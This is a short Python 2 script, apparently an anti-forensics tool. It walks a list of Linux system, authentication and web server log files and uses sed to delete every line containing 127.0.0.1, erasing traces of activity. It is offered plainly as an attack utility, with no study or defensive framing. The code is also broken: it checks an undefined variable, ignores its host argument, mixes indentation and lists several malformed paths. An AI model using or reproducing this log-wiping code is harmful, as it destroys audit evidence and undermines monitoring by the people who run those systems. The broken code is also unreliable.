#!/usr/bin/python
#coding=utf-8
import sys
import subprocess
import os

def usage():
	print "This is linux log clear python script."
	print "Usage: ./linux_log_clear.py"

try:
	host = sys.argv[1]
	#
	logs = ["/var/log/messages","/var/log/messages.1","/etc/syslog.conf","/var/log/secure","/var/log/message","/var/log/lastlog","/var/log/auth.log","/var/log/vsftpd.log","/var/log/apache2/access.log","/var/log/apache2/error.log","/var/log/apache2/error.log.1","/usr/local/httpd/error.log","/apache/apache/message.log","/var/log/apache2/access_log","/var/log/apache2/error.log","/var/log/apache2/error_log ","/var/log/apache/access.log","/var/log/apache/access_log","/var/log/apache/error.log","/var/log/apache/error_log","/var/www/logs/error_log"," /var/www/logs/error.log"," /var/www/logs/access_log","/var/www/logs/access.log","/usr/local/apache/logs/error_log"," /usr/local/apache/logs/error.log","/usr/local/apache/logs/access_log","usr/local/apache/logs/access.log","/var/log/error_log","/var/log/error.log","/var/log/access_log","/var/log/access.log","/usr/local/apache/logs/error_logerror_log.old","/usr/local/apache/logs/access_logaccess_log.old","/var/log/access.log","/var/log/access_log","/usr/local/apache/logs/error_log","/usr/local/apache/logs/error.log","/usr/local/apache/logs/access.log","/var/log/messages.1","/var/log/messages.2","/var/log/messages.3","/var/log/messages.4","/var/log/secure.1","/var/log/secure.2","/var/log/secure.3","/var/log/secure.3","/var/log/secure.4"]
	if len(sys.argv) != 2:
		usage()
	else:
		for log in logs:
			#
			if os.path.exists(line):
				#
				subprocess.call("sed -i '/127.0.0.1/d' %s"%log,shell=True)
                  		print "[+] %s " % (log)
         		else:
				print "[-] %s " % (log)
except:
	usage()